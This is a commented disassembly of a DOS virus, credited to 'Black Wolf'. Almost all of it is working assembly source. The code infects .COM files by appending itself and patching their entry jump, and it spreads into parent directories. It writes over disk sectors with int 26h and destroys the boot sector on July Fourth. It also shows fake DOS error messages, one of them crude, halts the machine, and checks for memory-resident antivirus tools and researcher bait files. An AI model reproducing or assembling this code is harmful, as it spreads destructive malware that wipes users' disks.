**************************************************************************
;*  CAUTION! This virus performs absolute disk writes when it activated!  *
;*It checks for something in memory, probably some resident AV utility.   *
;*                  (In other words, it can trash your disk!)             *
;*                         Disassembly by Black Wolf                      *
;**************************************************************************
.model tiny                
.radix 16
.code   
    org     100
start:
        jmp     start_virus
id_byte:        db       1Ah

;**************************************************************************
;*                       Infected Program Goes Here.                      *
;**************************************************************************

storage_bytes:                          ;First four bytes of host program.
        nop             
        nop
        int     20


;**************************************************************************
;*                       Virus Entry Point (start_virus)                  *
;**************************************************************************
start_virus:
        call    get_offset
get_offset:
        pop     bp
        sub     bp,offset get_offset    ;get offset of virus
        mov     [bp+store_ax],ax
        
        xor     di,di                   
        mov     word ptr [di+4Ah],0     ;in reserved area of PSP
        mov     es,di                   ;ES=0 (Interrupt Table)
        mov     si,96                   ;SI=96 (Int 25)
        mov     bx,es:[si]              ;Get Int 25 address
        mov     cx,es:[si+2]
        lea     dx,[bp+int_25]          ;Int 25 handler
        mov     es:[si],dx              
        mov     dx,cs                   ;Set Int 25 address
        mov     es:[si+2],dx

;   The code below seems to check for either another virus or perhaps an
;anti-viral program in memory that sets the address of int 7F to FFFFh to 
;mark its presence.  This may be to avoid detection by certain memory
;resident anti-viral utilities that analyse behavior, or to prevent conflicts
;with another virus.  A TSR vaccine might also be a possibility.

        mov     si,es:[di+1fe]          ;Int 7f (marker)
        cmp     si,0FFFFh               ;Has it been set?
        jne     Restore_Host_And_Infect ;No, jump Restore_Host_And...
        jmp     short Restore_Control   ;Already set, jump to
        nop                             ;Restore_Control

Restore_Host_And_Infect:
        mov     cs:[di+4Ch],bx          ;Save old Int 25 address
        mov     cs:[di+4Eh],cx          ;inside PSP ("reserved" area)
        push    cs
        pop     es
        mov     byte ptr [bp+infect_count],0   ;reset infect counter
        lea     si,[bp+storage_bytes]          ;si=storage bytes
        mov     di,100                         ;di=start of com
        mov     cx,4
        cld                             
        rep     movsb                   ;restore storage 
        mov     ah,1Ah                  ;bytes to host
        lea     dx,[bp+new_DTA]         ;DS:DX = new_DTA
        int     21h                     ;Change DTA to new_DTA
                        
        mov     ah,4Eh                  
        lea     dx,[bp+file_mask]       ;setup find first for *.com
        lea     si,[bp+new_DTA+1e]      ;set SI=Filename in DTA
        push    dx                      ;save mask address
        jmp     short Find_First_Next


Restore_Control:                                ;This restores defaults and
                        ;gives control to host COM.
        mov     ah,1Ah
        mov     dx,80               
        int     21h                     ;reset DTA to default in PSP
                          
        xor     di,di                 
        mov     es,di                   ;ES:DI=Interrupt table
        mov     si,96                   ;ES:SI=Int 25
        mov     bx,cs:[di+4Ch]          
        mov     es:[si],bx              ;Get old Int 25 address
        mov     cx,cs:[di+4Eh]          ;and restore Int 25
        mov     es:[si+2],cx            
        push    cs
        pop     es
        mov     ax,[bp+store_ax]        ;restore ax to original
        mov     bx,di                   ;zero registers
        mov     cx,bx
        mov     dx,cx
        mov     si,dx
        mov     sp,0FFFE                ;restore SP to default
        mov     bp,100                  ;BP=start of COM file
        push    bp                      ;Push 100 for ret
        mov     bp,ax                   ;reset BP
        ret                             ;Go to CS:100 to restore
                        ;control to host program

Close_File:
        or      bx,bx                   
        jz      Find_Next                   
        mov     ah,3Eh                  ;Close file if handle is
        int     21h                     ;not 0 (Console)
                        
        xor     bx,bx                   
Find_Next:
        mov     ah,4Fh                  ;find next
Find_First_Next:
        pop     dx
        push    dx
        xor     cx,cx                   
        xor     bx,bx                   
        int     21h                     ;find first/next match
                        ;with normal attributes
        jnc     Infect_File                   
        jmp     short No_More_Files
        nop
Infect_File:
        mov     ax,3D02h
        mov     dx,si
        int     21h                     ;open file for read/write
                        
        jc      Close_File              ;Jump on error
        mov     bx,ax
        mov     ah,3Fh                  
        mov     cx,4
        lea     dx,[bp+storage_bytes] 
        int     21h                    ;read four bytes into storage
                        
        cmp     byte ptr [bp+storage_bytes+3],1Ah ;Check for ID byte.
        je      Close_File                        ;Already infected... 
        cmp     byte ptr [bp+storage_bytes],4Dh   ;Is it an EXE?
        je      Close_File                        ;Yes? Don't Infect.
        
        mov     ax,4202h
        xor     cx,cx                  ;Got to the end of file
        xor     dx,dx
        int     21h

        cmp     ax,0FD00h              ;Is file over 64768 bytes?
        ja      Close_File             ;Too big, jump Close_File
        mov     [bp+file_size],ax
        mov     ah,40h                
        mov     cx,4
        lea     dx,[bp+storage_bytes] 
        int     21h                     ;Write Storage Bytes
                        
        mov     ah,40h                  
        mov     cx,end_virus-start_virus ;CX=virus size
        lea     dx,[bp+start_virus]      ;Write from start of virus
        int     21h                      ;Append Virus to Host
                        
        mov     ax,4200h
        xor     cx,cx                   
        xor     dx,dx                   
        int     21h                   ;Move back to beginning of file
                        
        mov     ax,[bp+file_size]     ;Setup Jump
        inc     ax
        mov     word ptr [bp+storage_bytes+1],ax     ;Jump size
        mov     byte ptr [bp+storage_bytes],0E9h     ;Jump Command
        mov     byte ptr [bp+storage_bytes+3],1Ah    ;ID byte

        mov     ah,40h                 
        mov     cx,4
        lea     dx,[bp+storage_bytes]   
        int     21h                         ;Write jump to file
                        
        inc     byte ptr [bp+infect_count]  ;increment infect_count
        jmp     Close_File                   
No_More_Files:
        cmp     byte ptr [bp+infect_count],2 ;Check infect_count
        jae     activation                   ;If >=2 go activation
        mov     di,100
        cmp     word ptr [di],20CDh   ;are first bytes an "Int 20"?
        je      activation            ;Yes? Activate, it's probably
                          ;bait. (i.e. a researcher.)
        lea     dx,[bp+Parent_Dir] 
        mov     ah,3Bh             
        int     21h                   ;Move back one directory
                       
        jc      activation            ;In root directory? Activate.

        mov     ah,4Eh                ;find next file
        jmp     Find_First_Next                   
activation:
        xor     di,di              
        mov     es,di
        mov     ah,2Ah             
        int     21h                   ;Get Date/Time

;If the virus is run on the Fourth of July, it will trash sector 0 of the
;default drive, killing the boot sector.
        
        cmp     dl,4                  ;Is it the Fourth?
        jne     Not_Yet               ;No? Jump to Not_Yet
        cmp     dh,7                  ;Is it July?
        jne     Not_Yet               ;No? Jump to Not_Yet
        xor     ax,ax                  
        jmp     short trash_disk      ;Trash boot sector 
        nop                           ;on July Fourth.     
                          
        
Not_Yet:
        mov     ah,2Ch       
        int     21h                   ;Get time
               
        or      cl,cl                 ;Do minutes = 0? 
        jnz     Dont_Kill_HD          ;No? Jump Dont_Kill_HD
        cmp     ch,6                  ;Is it passed 6:00 am?
        jge     Dont_Kill_HD          ;Yes? Jump Dont_Kill_HD

Stupid_Damage_Algorithm:                
        add     cl,ch                 ;Add minutes and hours
        mov     ax,cx                   
        cbw                           ;Change the byte to a word
        add     al,dh                 ;Add the month
        adc     al,dl                 ;Add the day, carrying result
                          ;from the last addition
        adc     ah,0                  ;Add any carried numbers
        or      ax,ax                 ;And if it all comes out zero
        jnz     trash_disk            ;set AX=1, Otherwise keep AX.
        inc     ax                    ;Trash disks either way.

trash_disk:
        mov     dx,ax                 ;Sector #.  This will be more
                          ;or less random except on July
                          ;Fourth, when it kills sector 0,
                          ;which contains the boot sector.
        mov     cx,1                  ;Number of sectors to trash 
        xor     bx,bx                 ;Address to write from
        mov     ah,19h                
        int     21h                   ;Get default drive
        int     26h                   ;And trash sector.
Dont_Kill_HD:
        mov     bx,offset Random_Table
        mov     ah,2Ch                  
        int     21h                     ;Get Time
                        
        inc     dh                      ;Increment Seconds
                        ;(prevent 0)
Lower_Sec_Loop:
        cmp     dh,byte ptr [Rnd_String_Key]
        jl      Random_Alg
        sub     dh,byte ptr [Rnd_String_Key]               
        jmp     short Lower_Sec_Loop

                       ;DH = 01h to 0Ah

Random_Alg:                            ;Get a random number to choose string.

        mov     al,dh          ;Move random number to AL
        mov     cl,al          ;And to CL (minutes)
        cbw                    ;Make AL into word AX
                       ;(In this case, zeros AH)

                       ;AX is now between 1 and 45h (69)

        shl     ax,1           ;Multiply by 2
        add     bx,ax          ;Add AX to BX    (Selection address)
        mov     si,[bx]        ;Get byte from address at [BX] into SI
                       ;  This will contain the address of a
                       ;            string to print.

        mov     ch,[si-1]      ;Get byte from SI-1 into CH 
        mov     dx,si          ;Print chosen string at DX until a '$' 
        mov     ah,9
        int     21h

        cmp     ch,0            ;was the byte from [SI-1] a 0?
        jne     Halt            ;If not, jump Halt

Terminate_Program:
        int     20h             ;Kill program

Halt:
        cmp     ch,1              ;Was it a 1?
        jne     Choose_What_Ta_Do ;If not, jump to Choose_What_Ta_Do
        hlt                       ;otherwise, halt processor
Choose_What_Ta_Do:
        cmp     ch,2              ;Was it a 2?
        je      Abort_Retry_Etc   ;If so, jump to Abort_Retry_Etc
Go_To_Host:                               ;Otherwise, run host
        jmp     Restore_Control                  
Abort_Retry_Etc:
        lea     dx,[bp+Error_Message_1] ;Display "Abort, Retrt" etc..
        mov     ah,9
        int     21h
               
        mov     ah,1
        int     21h                     ;Get Key with Echo
                      
        lea     dx,[bp+Carriage_Ret]    ;print a return
        mov     ah,9
        int     21h                     
                        
        mov     dh,cl
        cmp     al,5Ah                  
        ja      Harass_Em               ;set letter to lowercase
        add     al,20h                  
Harass_Em:         
        cmp     al,61h                  ;If (A)bort then jump to
        je      Terminate_Program       ;Terminate_Program
        cmp     al,72h                  ;If (R)etry then go on, 
        jne     Harass_Em_More          ;otherwise jump to Harass_Em_More
        lea     dx,[bp+Carriage_Ret]    
        mov     ah,9
        int     21h                     ;Print a carriage return
                        
        jmp     short Random_Alg           
Harass_Em_More:
        cmp     al,69h                  ;If user presses (I)gnore
        je      Go_To_Host              ;jump to Go_To_Host, (F)ail
        cmp     al,66h                  ;continue, anything else
        jne     Abort_Retry_Etc         ;then jump to Abort_Retry_Etc
        
        lea     dx,[bp+Error_message_2] 
        mov     ah,9
        int     21h                     ;Display "Fail on INT 24"
                        
        int     20h                     ;Terminate Program

Rnd_String_Key  db      0Ah
Random_Table    db      65h, 03h, 8Ah, 03h,0AEh, 03h  ;Used to select string
        db      0D4h, 03h,0D4h, 03h,0D4h, 03h
        db      0D4h, 03h,0D4h, 03h,0D4h, 03h
        db      0D4h, 03h

Error_Message_1 db      0dh,0a,'Abort, Retry, Ignore, Fail?$'
Carriage_Ret    db      0dh,0a,24
Error_Message_2 db      0dh,0a,0dh,0a,'Fail on INT 24',0dh,0a,24
        
        db       02h
Dumb_Mes_1      db      'Impotence error reading user''s dick$'
        db      0
Dumb_Mes_2      db      'Program too big to fit in memory',0dh,0a,24
        db       01h
Dumb_Mes_3      db      'Cannot load COMMAND, system halted',0dh,0a,24
        db      3
Dumb_Mes_4      db      'Joker!',0dh,0a,0dh,0a,24

int_25:                                 ;Int 25 Handler
        xor     al,al
        iret

file_mask       db      '*.COM',0                
Parent_Dir      db      '..',0

end_virus:        
new_DTA         db      2bh dup (?)
store_ax        dw      ?      
infect_count    db      ?
file_size       dw      ?

end     start

